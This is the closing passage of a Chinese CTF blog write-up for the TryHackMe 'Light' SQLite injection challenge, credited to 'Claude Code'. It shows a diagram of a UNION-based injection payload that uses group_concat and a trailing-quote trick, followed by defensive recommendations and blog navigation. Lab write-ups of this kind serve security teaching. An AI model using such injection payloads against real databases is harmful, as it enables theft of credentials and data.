+<p><strong>原理图解</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原始: SELECT password FROM usertable WHERE username = &#x27;&#123;INPUT&#125;&#x27; LIMIT 30</span><br><span class="line"></span><br><span class="line">注入: SELECT password FROM usertable WHERE username = &#x27;&#x27;</span><br><span class="line">      UNION</span><br><span class="line">      SELECT (SELECT group_concat(column) FROM table) || &#x27;a&#x27;</span><br><span class="line">      LIMIT 30</span><br><span class="line">                    ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑</span><br><span class="line">                    子查询结果 + &#x27;a&#x27; → 消耗尾部引号</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🛡️-七、防御建议"><a href="#🛡️-七、防御建议" class="headerlink" title="🛡️ 七、防御建议"></a>🛡️ 七、防御建议</h2><ol>
+<li><strong>使用参数化查询（Prepared Statements）</strong></li>
+<li><strong>输入验证</strong>：白名单校验，而非黑名单过滤</li>
+<li><strong>最小权限原则</strong>：数据库用户权限最小化</li>
+<li><strong>错误信息隐藏</strong>：不向用户暴露数据库错误详情</li>
+<li><strong>WAF 部署</strong>：检测并拦截 SQL 注入攻击</li>
+</ol>
+<hr>
+<blockquote>
+<p><strong>Write Author</strong>: Claude Code<br><strong>Date</strong>: 2026-06-09<br><strong>Challenge</strong>: Light Database - SQLite Injection</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Light.html">https://x9wd09ncc.github.io/post/TryHackMe_Light.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/ai/">ai</a><a class="post-meta__tags" href="/tags/sql/">SQL</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/TryHackMe_Cheese_CTF.html" title="TryHackMe_Cheese CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Cheese CTF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Cheese_CTF.html" title="TryHackMe_Cheese CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-05</div><div class="title">TryHackMe_Cheese CTF</div></div></a></div><div><a href="/post/TryHackMe_GamingServer.html" title="TryHackMe_GamingServer"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-05</div><div class="title">TryHackMe_GamingServer</div></div></a></div><div><a href="/post/TryHackMe_GoldenEye.html" title="TryHackMe_GoldenEye"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-04</div><div class="title">TryHackMe_GoldenEye</div></div></a></div><div><a href="/post/TryHackMe_b3dr0ck.html" title="TryHackMe_b3dr0ck"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-04</div><div class="title">TryHackMe_b3dr0ck</div></div></a></div><div><a href="/post/TryHackMe_source.html" title="TryHackMe_source"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-04</div><div class="title">TryHackMe_source</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-WP-Light-Database-SQLite-Injection"><span class="toc-number">1.</span> <span class="toc-text">CTF WP: Light Database - SQLite Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8C-%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📌 题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2 服务识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%9B-%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">🐛 二、漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 输入过滤测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 绕过关键词过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%A1%AE%E8%AE%A4-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 确认 SQL 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%89-%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">💉 三、漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%8E%A8%E6%96%AD%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1 推断查询结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E7%A1%AE%E8%AE%A4%E5%88%97%E6%95%B0"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2 确认列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.3 获取数据库表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E5%8F%91%E7%8E%B0%E9%9A%90%E8%97%8F%E8%A1%A8"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.4 发现隐藏表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E6%8F%90%E5%8F%96usertable"><span class="toc-number">1.4.5.</span> <span class="toc-text">3.5 提取usertable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-%E6%8F%90%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%95%B0%E6%8D%AE%EF%BC%88admintable%EF%BC%89"><span class="toc-number">1.4.6.</span> <span class="toc-text">3.6 提取管理员数据（admintable）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%81-%E5%9B%9B%E3%80%81%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C"><span class="toc-number">1.5.</span> <span class="toc-text">🏁 四、最终结果</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.5.1.</span> <span class="toc-text">管理员账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">1.5.2.</span> <span class="toc-text">Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9D-%E4%BA%94%E3%80%81%E5%AE%8C%E6%95%B4-Payload-%E6%B1%87%E6%80%BB"><span class="toc-number">1.6.</span> <span class="toc-text">📝 五、完整 Payload 汇总</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%85%AD%E3%80%81%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">🧠 六、技术总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%A0%B8%E5%BF%83%E9%9A%BE%E7%82%B9"><span class="toc-number">1.7.1.</span> <span class="toc-text">6.1 核心难点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-SQLite-%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text">6.2 SQLite 特性利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.7.3.</span> <span class="toc-text">6.3 注入模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.8.</span> <span class="toc-text">🛡️ 七、防御建议</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
